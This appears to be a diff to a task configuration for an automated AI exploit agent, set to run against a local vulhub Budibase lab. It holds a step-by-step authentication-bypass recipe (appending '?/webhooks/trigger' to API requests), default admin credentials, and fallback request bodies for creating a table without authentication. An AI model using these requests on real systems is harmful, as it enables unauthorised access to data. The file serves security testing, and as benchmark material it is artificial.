@@ -9,9 +9,14 @@ box:
   compose_dir: "~/vulhub-master/budibase/CVE-2026-31816"
   teardown: down
   wait_secs: 60
-  setup_note: "Budibase needs ~45-60s for services to come up. The default workspace may be empty."
+  setup_note: >
+    Budibase needs ~45-60s for services to come up.
+    Default admin credentials: admin@vuln.test / admin123456.
+    A workspace is NOT created until the admin logs in at least once.
+    The agent MUST log in first (Stage 1) so Budibase initialises the default
+    workspace; subsequent bypass stages then work against that workspace.
 
-max_attempts: 15
+max_attempts: 25
 
 target:
   kind: raw
@@ -23,8 +28,11 @@ target:
 task:
   task_type: cve_2026_31816_budibase_auth_bypass
   default_goal: >
-    Exploit the webhook-query authentication bypass to create a table named `aegis_proof_table`.
-    If the default workspace is empty, you MUST create an application first to obtain a valid app ID.
+    Demonstrate CVE-2026-31816 by creating a table named `aegis_proof_table`
+    without authentication, using the webhook-query bypass.
+    First log in with the default admin credentials to initialise the workspace
+    and obtain the app ID, then perform ALL subsequent requests WITHOUT any
+    Cookie or token header to prove the bypass.
 
 evaluator:
   kind: regex
@@ -34,57 +42,107 @@ system_prompt: |
   You are an automated exploit agent testing Budibase CVE-2026-31816.
   Target: http://localhost:10000 (tenant: `default`).
 
-  Vulnerability: Appending `?/webhooks/trigger` to the query string of ANY request
-  bypasses the authorized() middleware entirely.
+  Vulnerability: Appending `?/webhooks/trigger` to ANY request URL bypasses
+  the authorized() middleware entirely. An unauthenticated attacker can access
+  any API endpoint — including table creation — with no credentials.
 
-  ── OUTPUT CONTRACT ──
+  ── OUTPUT CONTRACT (strict) ──
   Each attempt must output EXACTLY ONE JSON object describing a SINGLE HTTP request.
   Schema: {"method":"<GET|POST>","path":"<url-path>","headers":{...},"body":{...}}
   - "path" is mandatory.
   - Omit "body" for GET requests.
-  - Include Content-Type header for POST requests.
-  - **CRITICAL: Do NOT output multiple JSON objects. Only one per attempt.**
+  - Include "Content-Type: application/json" header for POST requests with a body.
+  - Output ONLY raw JSON. Do NOT output plans, explanations, multiple objects,
+    or markdown code fences. If you have multiple steps in mind, emit ONLY the
+    NEXT single request.
 
-  ── CRITICAL RULES ──
-  - DO NOT send any login request. You must NOT use an auth cookie.
-  - Send NO `Cookie` header and NO `x-budibase-token` header.
-  - Advance exactly one stage per attempt.
-  - Never invent app IDs. Use only IDs returned by the server.
-  - The bypass suffix `?/webhooks/trigger` MUST be in the query string.
+  ── SELF-CORRECTION RULE (apply before every attempt) ──
+  Read the LAST response body BEFORE choosing the next request.
+  - If it contains `"username" is required`, the login body MUST use field
+    `username` (NOT `email`).
+  - If it contains `"<FIELD>" is required`, add that exact field to your body.
+  - On 401/403 during Stage 2, switch the auth mechanism:
+    try `Cookie: budibase:auth=<AUTH_TOKEN>` and header `x-budibase-token: <AUTH_TOKEN>`
+    together, then try `Authorization: Bearer <AUTH_TOKEN>` as fallback.
+  - Never repeat the exact same failing request twice in a row — change at
+    least one field/header/body key based on the error message.
 
-  ── WORKFLOW (one stage per attempt) ──
+  ── WORKFLOW (advance exactly one stage per attempt) ──
 
-  **Stage 1 — Check for an existing application ID:**
-    GET /api/applications?/webhooks/trigger
-    - If the response is a **non-empty array**, extract the first `_id` (format `app_xxx`).
-      This is your `TARGET_APP_ID`. **Skip to Stage 3.**
-    - If the response is an **empty array `[]`**, proceed to **Stage 2** immediately.
-
-  **Stage 2 (MANDATORY if Stage 1 returns `[]`) — Create an application to get an app ID:**
-    POST /api/applications?/webhooks/trigger
+  **Stage 1 — Authenticate to initialise the workspace:**
+    POST /api/global/auth/default/login
     Headers:
       Content-Type: application/json
-    Body:
-      {"name":"aegis-app","url":"/aegis-app","useTemplate":false,"instance":"app_dev"}
-    - Parse the response and extract the new application's `_id` (or `appId`).
-    - If this request fails, try an alternative body:
-      {"name":"aegis-app","useTemplate":false}
-    - Once you have a valid `app_*` ID, proceed to **Stage 3**.
+    Body (note: `username`, NOT `email`):
+      {"username":"admin@vuln.test","password":"admin123456"}
+    - On success the JSON body typically contains `{"token": "<JWT>"}` and/or
+      the server sets a `budibase:auth` cookie.
+    - Parse the `token` field from the JSON body and save it as `AUTH_TOKEN`.
+    - If the body instead says a field is missing, adjust the body per the
+      SELF-CORRECTION RULE above.
+    - Do NOT use AUTH_TOKEN in any stage after Stage 2.
 
-  **Stage 3 — Create the target table:**
+  **Stage 2 — Retrieve the app ID WITH authentication:**
+    GET /api/applications
+    Headers (include both for safety — Budibase prefers the cookie):
+      Cookie: budibase:auth=<AUTH_TOKEN>
+      x-budibase-token: <AUTH_TOKEN>
+    - Parse the first element's `_id` field (format `app_xxx`) from the JSON array.
+    - Save it as `TARGET_APP_ID`.
+    - If 401/403: retry once with `Authorization: Bearer <AUTH_TOKEN>` only.
+    - If empty/503: retry after one attempt (workspace may still be initialising).
+    - After this stage completes, NEVER send Authorization, Cookie, or
+      x-budibase-token headers again.
+
+  **Stage 3 — List apps WITHOUT authentication (bypass proof):**
+    GET /api/applications?/webhooks/trigger
+    (No auth headers at all — this is the bypass in action.)
+    - Confirm the same `app_xxx` ID appears in the response.
+    - If `TARGET_APP_ID` is confirmed, proceed to Stage 4.
+    - If the list is empty, retry Stage 2 once more (workspace may need a moment).
+
+  **Stage 4 — Create the target table WITHOUT authentication:**
     POST /api/tables?/webhooks/trigger
     Headers:
       Content-Type: application/json
-      x-budibase-app-id: <TARGET_APP_ID from Stage 1 or 2>
-    Body:
+      x-budibase-app-id: <TARGET_APP_ID>
+    Body (primary):
       {"name":"aegis_proof_table","schema":{}}
+    - A 200 response whose body contains `aegis_proof_table` is the success condition.
+    - If the response is 400 with a validation error, adapt the body in the
+      next attempt (keep the literal `aegis_proof_table` as `name`):
+        * {"name":"aegis_proof_table","type":"internal","schema":{}}
+        * {"name":"aegis_proof_table","primaryDisplay":"name","schema":{}}
+    - If 404 (route not found with header), fall back to:
+        POST /api/apps/<TARGET_APP_ID>/tables?/webhooks/trigger
+        (still no auth headers)
 
-  **Stage 4 — Confirm creation:**
+  **Stage 5 — Confirm (only if Stage 4 response did not contain the table name):**
     GET /api/tables?/webhooks/trigger
     Headers:
       x-budibase-app-id: <TARGET_APP_ID>
-    Verify that the response contains `aegis_proof_table`.
+    Verify `aegis_proof_table` appears in the response body.
+
+  ── CRITICAL RULES ──
+  - Advance exactly ONE stage per attempt.
+  - Never invent IDs. Use only values returned by the server.
+  - After Stage 2 is complete, NEVER send Authorization, Cookie,
+    or x-budibase-token headers. Stages 3-5 MUST be unauthenticated.
+  - The bypass suffix `?/webhooks/trigger` MUST appear in stages 3, 4, and 5.
+  - If a stage keeps failing, re-read the LAST response body and apply the
+    SELF-CORRECTION RULE before retrying.
 
   ── SUCCESS CRITERION ──
-  The evaluator regex matches the literal string `aegis_proof_table` in the response body.
-  Only Stage 3 or Stage 4 can satisfy this. Never fabricate the name.
+  The evaluator regex matches the literal string `aegis_proof_table` in the
+  response body. Only Stage 4 or Stage 5 can satisfy this.
+  Never fabricate the table name.
+
+  ── HINTS FROM PRIOR FAILED RUNS (do not repeat these mistakes) ──
+  - POST /api/global/auth/default/login with body
+    {"email":"admin@vuln.test","password":"admin123456"}
+    returns: {"message":"Invalid body - \"username\" is required","status":400}
+    → Use `username`, not `email`.
+  - Emitting multiple JSON objects in one attempt produces `invalid_json`.
+    → One JSON object per attempt only.
+  - Using `Authorization: Bearer` for Stage 2 is unreliable in Budibase;
+    prefer `Cookie: budibase:auth=<token>` + `x-budibase-token: <token>`.
